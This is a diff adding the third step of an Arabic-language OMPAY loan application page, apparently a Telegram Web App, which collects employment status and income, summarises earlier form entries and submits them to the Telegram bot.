@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OMPAY - ملخص الطلب</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --ompay-primary: #004b87;
+            --ompay-hover: #003366;
+            --ompay-blue-light: #0077b6;
+            --bg-color: #f0f4f8;
+            --card-bg: #ffffff;
+            --text-main: #1e293b;
+            --text-muted: #64748b;
+            --input-border: #cbd5e1;
+            --btn-gray: #e2e8f0;
+            --btn-gray-text: #475569;
+        }
+
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+
+        .app-header {
+            width: 100%; background-color: var(--ompay-primary); height: 60px; padding: 0 20px;
+            display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100;
+            border-bottom: 3px solid var(--ompay-blue-light);
+        }
+        .back-btn-top { color: white; text-decoration: none; font-weight: 600; font-size: 15px; cursor: pointer; display: flex; align-items: center; gap: 5px; }
+        .header-title { position: absolute; left: 50%; transform: translateX(-50%); display: flex; font-size: 20px; font-weight: 800; color: white; }
+        .header-title .om { color: #90e0ef; margin-left: 4px; }
+        .header-title .pay { color: #ffffff; }
+
+        .card {
+            background: white; width: 90%; max-width: 440px; margin: 20px 0 30px; padding: 32px 24px;
+            border-radius: 16px; box-shadow: 0 4px 20px rgba(0, 75, 135, 0.08); display: flex; flex-direction: column;
+            border-top: 5px solid var(--ompay-blue-light);
+        }
+        .main-title { font-size: 24px; color: var(--text-main); margin: 0 0 6px; text-align: center; font-weight: 800; }
+        .subtext { font-size: 14px; color: var(--text-muted); text-align: center; margin-bottom: 20px; }
+
+        .step-indicator { display: flex; gap: 12px; margin: 0 auto 32px; width: 80%; }
+        .step-bar { flex: 1; height: 4px; background-color: #e2e8f0; border-radius: 2px; }
+        .step-bar.active { background-color: var(--ompay-primary); }
+
+        .form-group { margin-bottom: 22px; display: flex; flex-direction: column; }
+        .form-group label { font-size: 15px; font-weight: 700; color: #1e293b; margin-bottom: 10px; }
+        .form-control {
+            font-size: 15px; padding: 14px 16px; border: 1px solid var(--input-border); border-radius: 10px;
+            background-color: #ffffff; color: #334155; outline: none; width: 100%; text-align: right;
+        }
+        .form-control:focus { border-color: var(--ompay-primary); }
+
+        .summary-card {
+            background-color: #f8fafc; border-right: 4px solid var(--ompay-primary); padding: 18px 16px;
+            border-radius: 10px; margin: 10px 0 24px; border: 1px solid #e2e8f0; border-right-width: 4px;
+        }
+        .summary-card h3 { margin: 0 0 14px 0; font-size: 16px; font-weight: 800; color: var(--text-main); }
+        .summary-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; padding-bottom: 8px; border-bottom: 1px solid #e2e8f0; }
+        .summary-label { color: #64748b; font-size: 13.5px; font-weight: 500; }
+        .summary-value { font-weight: 700; font-size: 13.5px; color: #1e293b; text-align: left; }
+
+        .btn-container { display: flex; flex-direction: column; gap: 12px; margin-top: 10px; }
+        .btn-prev { background-color: var(--btn-gray); color: var(--btn-gray-text); border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 700; cursor: pointer; }
+        .btn-next { background-color: var(--ompay-primary); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 800; cursor: pointer; }
+        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #64748b; margin-top: auto; }
+    </style>
+</head>
+<body>
+
+<div class="app-header">
+    <a onclick="goBack()" class="back-btn-top">→ رجوع</a>
+    <div class="header-title">
+        <span class="pay">OM</span><span class="om">PAY</span>
+    </div>
+    <div style="width: 24px;"></div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">طلب القرض</h1>
+    <div class="subtext">الخطوة 3 من 3</div>
+
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+    </div>
+
+    <form id="step3Form" onsubmit="submitForm(event)">
+        <div class="form-group">
+            <label for="jobStatus">الوضع الوظيفي</label>
+            <select id="jobStatus" class="form-control" required>
+                <option value="موظف حكومي/خاص" selected>موظف (قطاع حكومي / خاص)</option>
+                <option value="رائد أعمال / تجار">رائد أعمال / أعمال خاصة</option>
+                <option value="طالب">طالب</option>
+                <option value="بدون عمل">بدون عمل</option>
+                <option value="متقاعد">متقاعد</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="income">متوسط الدخل الشهري (ر.ع.)</label>
+            <input type="number" id="income" class="form-control" placeholder="مثال: 800" required>
+        </div>
+
+        <div class="summary-card">
+            <h3>ملخص الطلب</h3>
+            <div class="summary-row"><span class="summary-label">مبلغ القرض:</span><span class="summary-value" id="sumAmount">--</span></div>
+            <div class="summary-row"><span class="summary-label">مدة القرض:</span><span class="summary-value" id="sumDuration">--</span></div>
+            <div class="summary-row"><span class="summary-label">الغرض من القرض:</span><span class="summary-value" id="sumPurpose">--</span></div>
+            <div class="summary-row"><span class="summary-label">المتقدم:</span><span class="summary-value" id="sumName">--</span></div>
+            <div class="summary-row"><span class="summary-label">الهاتف:</span><span class="summary-value" id="sumPhone">--</span></div>
+        </div>
+
+        <div class="btn-container">
+            <button type="submit" class="btn-next">إرسال الطلب</button>
+            <button type="button" class="btn-prev" onclick="goBack()">السابق</button>
+        </div>
+    </form>
+</div>
+
+<div class="footer-banner">© 2026 OMPAY سلطنة عمان</div>
+
+<script>
+window.onload = () => {
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();   
+        window.Telegram.WebApp.expand();
+    }
+
+    const amount = localStorage.getItem('appliedAmount') || localStorage.getItem('amount');
+    const term = localStorage.getItem('appliedTerm') || localStorage.getItem('loanDuration');
+    const purpose = localStorage.getItem('appliedPurpose') || localStorage.getItem('loanPurpose');
+    const fName = localStorage.getItem('firstName') || "";
+    const lName = localStorage.getItem('lastName') || "";
+    const phone = localStorage.getItem('phone') || "";
+
+    if (amount) {
+        const numAmount = Number(amount.replace(/\D/g, ''));
+        document.getElementById('sumAmount').innerText = numAmount ? `${numAmount.toLocaleString('en-US')} ر.ع.` : `${amount} ر.ع.`;
+    }
+
+    document.getElementById('sumDuration').innerText = term ? term : "--";
+    document.getElementById('sumPurpose').innerText = purpose ? purpose : "--";
+    document.getElementById('sumName').innerText = `${fName} ${lName}`.trim() || "--";
+    document.getElementById('sumPhone').innerText = phone ? `+968 ${phone}` : "--";
+};
+
+function submitForm(event) {
+    event.preventDefault();
+    const tg = window.Telegram?.WebApp;
+    const incomeVal = document.getElementById('income').value.trim();
+
+    if (!incomeVal) {
+        alert("يرجى إدخال متوسط الدخل الشهري.");
+        return;
+    }
+
+    const data = {
+        amount: localStorage.getItem('appliedAmount') || localStorage.getItem('amount'),
+        duration: localStorage.getItem('appliedTerm') || localStorage.getItem('loanDuration'),
+        purpose: localStorage.getItem('appliedPurpose') || localStorage.getItem('loanPurpose'),
+        firstName: localStorage.getItem('firstName'),
+        lastName: localStorage.getItem('lastName'),
+        email: localStorage.getItem('email'),
+        phone: localStorage.getItem('phone'),
+        jobStatus: document.getElementById('jobStatus').value,
+        income: incomeVal,
+        currency: "OMR"
+    };
+
+    localStorage.setItem('jobStatus', data.jobStatus);
+    localStorage.setItem('income', incomeVal);
+
+    if (tg && tg.sendData) {
+        tg.sendData(JSON.stringify(data));
+        setTimeout(() => { window.location.href = "/page5"; }, 300);
+    } else {
+        window.location.href = "/page5";
+    }
+}
+
+function goBack() { window.location.href = "/page3"; }
+</script>
+</body>
+</html>
